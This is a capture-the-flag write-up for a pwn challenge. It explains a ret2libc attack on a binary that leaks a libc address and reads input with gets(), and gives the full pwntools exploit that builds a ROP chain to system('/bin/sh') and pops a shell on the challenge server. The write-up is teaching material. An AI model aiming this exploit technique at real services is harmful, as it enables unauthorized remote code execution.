![Screenshot 2025-02-17 000725](https://github.com/user-attachments/assets/66689f34-1117-411f-b525-4d468473d68b)
# Technique : *Ret2libc*
Solved by : Relster


## 1. Patch binary & Binary protection checking.
We're given 3 binaries from the challenge they are *chall*, *ld-2.27.so*, and *libc-2.27.so*. Now let's do a patching on the *chall* binary.
```bash
~/Desktop/ctf/pwninit    # You can change this according to where you put your pwninit
```

Checking binary protection.
```bash
$ pwn checksec chall_patched 
[*] '/home/relster/Desktop/ctf/ehax/pwn/test/chall_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    Stripped:   No
```


## 2. Analyze the binary statically & dynamically
Ghidra:\
![image](https://github.com/user-attachments/assets/5a8eb7b1-7f7c-417b-a5a1-ecceabab6762)\
Not much is happening here, the only main thing we need to pay attention is the *printf("%p",wctrans);* which is leaking a libc function to stdout and *gets((char \*)local_a8);* which lets us input more than the buffer could hold (overflow). From here we could tell that our exploit would implement ret2libc (return-to-libc) technique to achieve our goal which is popping a shell on remote machine.

PIE disabled is very helpful here because we can just grab our rop gadgets from the binary itself, below is the list of gadgets we'd use:\
```pop rdi; ret;``` <--- Popping the address of the string '/bin/sh\x00' to the RDI register.\
```ret;         ``` <--- Used for stack alignment purposes (since this is a 64bit binary).\
these 2 above would be enough to help us setup the exploit.

Noticed that PIE is disabled but here ASLR is enabled by default from our OS. Since ASLR randomizing base address of functions, then we'd have to use the leaked address at runtime to calculate the base address of *libc* in this case. If we got the base address of *libc* then address of function like *system()* would be easily obtain at runtime and we'd have to just do basic arithmetic of addresses here. The leaked address that we mention is *wctrans* as we see above in the *printf("%p",wctrans)*. Now we'd need the offset of *wctrans* to the *libc*'s base address, to obtain these offsets we can use *pwntools* we can also use *pwntools* to find the rop gadget that we need so we don't have to manually use *ropper*/*ROPgadget* to extract gadgets 1 by 1. One more thing to remember is the string '/bin/sh\x00' which we will need to pass it to *system()* where we can pop a shell. For obtaining the address of string '/bin/sh\x00' we can use method and function called *search()* and *next()*, more detail will be shown on the exploit. We will see the details below in the script.


## 3. Writing the exploit
We got 2 things to do here:
1. Find size from buffer to saved RBP.
2. Extract the leaked address from the binary and store it into a variable.

Let's find the offset first, this time we'll use gdb because it's straight forward (IMO).\
![image](https://github.com/user-attachments/assets/a55190e3-2701-4809-b848-d1dd2091ee9e)\
Since there's no canary so we don't have to worry about it. Let's put our focus to the buffer size and saved RBP, we can see that 0xa0 in decimal is 160, don't forget the 8 bytes of RBP too. So our total junk payload would be 168 bytes, this means our RIP will start at 169th byte up to 176th byte.

For extracting the *wctrans* leaked address we'd use python's slicing technique, more detail can be seen on the exploit.

Below is the final exploit for this challenge:
```python
#!/usr/bin/env python

from pwn import *

context.arch = 'amd64'
#context.log_level = 'DEBUG'

TARGET = './chall_patched'
HOST = 'chall.ehax.tech'    # nc chall.ehax.tech 4269
PORT = 4269

elf = ELF(TARGET)
libc = ELF('./libc.so.6')
ld = ELF("./ld-2.27.so")

if not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

gdb_script = f"""
    break *main
"""
#gdb.attach(p, gdbscript=gdb_script)

# ======================================= #
'''
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
'''

offset = b'A' * 168 # RIP at 169th

### 1st Step == Preparing everything (gadgets, offset, etc) ###

# gadgets & symbols offset
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi'])[0]
wctrans_offset = libc.symbols['wctrans']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b"/bin/sh\x00"))

print(f"ret : {hex(ret)}")
print(f"rdi : {hex(pop_rdi)}")
print(f"wctrans : {hex(wctrans_offset)}")
print(f"system : {hex(system_offset)}")
print(f"binsh : {hex(binsh_offset)}")

### 2nd Step == Calculating base address of libc and calculating other functions' address ###

# leaked wctrans, libc base, system()
p.recvline()
out = p.recvuntil(b'0x7')
leaked_wctrans = int((b'0x7' + p.recv()[:11]).decode(), 16)
libc_base = leaked_wctrans - wctrans_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset

print(f"leaked_wctrans : {hex(leaked_wctrans)}")
print(f"libc_base : {hex(libc_base)}")
print(f"system : {hex(system)}")
print(f"binsh : {hex(binsh)}")

### 3rd Step == Build payload and send it off to remote target ###

payload = flat(
    offset,
    ret,
    pop_rdi,
    binsh,
    system
)
p.sendline(payload)

p.interactive()
p.close()

# NOTE:
# ret2libc
```


## 4. Run the exploit
Local:\
![Screenshot 2025-02-17 024958](https://github.com/user-attachments/assets/39d3e76a-6b0f-48f4-8314-0aa1331bcea1)

Remote:\
![Screenshot 2025-02-17 025227](https://github.com/user-attachments/assets/ecbb101b-a013-42ae-b68f-8001b9f38eaa)


## Keyword
ret2libc\
ASLR and PIE\
x86_64 calling convention\
Binary dependency (specific libc for specific offset)
